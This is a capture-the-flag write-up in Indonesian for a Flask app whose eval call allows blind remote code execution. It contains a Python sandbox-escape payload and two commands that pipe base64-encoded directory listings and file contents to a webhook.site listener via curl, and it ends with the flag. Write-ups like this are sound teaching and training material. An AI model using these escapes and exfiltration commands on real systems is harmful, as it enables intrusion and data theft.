## Blind RCE

```python
@app.route("/")
def index():
    req = request.args.get("easy", "True")
    print(req)
    eval(req, {"__builtins__": {}}, {})

    return "OK"
```
- RCE yang disebabkan fungsi eval namun hanya mereturn 'OK'
----
## Pyjail

- [Bypass Python Sandboxes](https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes)
```python
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == "catch_warnings"][0]()._module.__builtins__["__import__"]("os")
```

- Tanpa menggunakan manual method untuk mencari class catch_warnings, gunakan comprehension list yang nantinya memanggil fungsi os.system()
-----
## Solve

- Setelah mendapat rce, terdapat kejanggalan karena reverse shell tidak berhasil.
- Solusi yaitu menggunakan curl karena dapat menerima http request yaitu flagnya dari server rce.
- Dengan memanfaatkan webhook sebagai listener

### payload 1
```python
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == "catch_warnings"][0]()._module.__builtins__["__import__"]("os").system('curl -X POST -d $(ls / | base64 -w 0) https://webhook.site/77128289-88a0-42a9-b37a-0f77c39f003b')
```

### payload 2
```python
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == "catch_warnings"][0]()._module.__builtins__["__import__"]("os").system('curl -X POST -d $(cat /flag-5d89320ac7ab789ac1beb60c294f526e.txt | base64 -w 0) https://webhook.site/77128289-88a0-42a9-b37a-0f77c39f003b')
```
### flag
LKSSMK{baby_python_is_really_easy}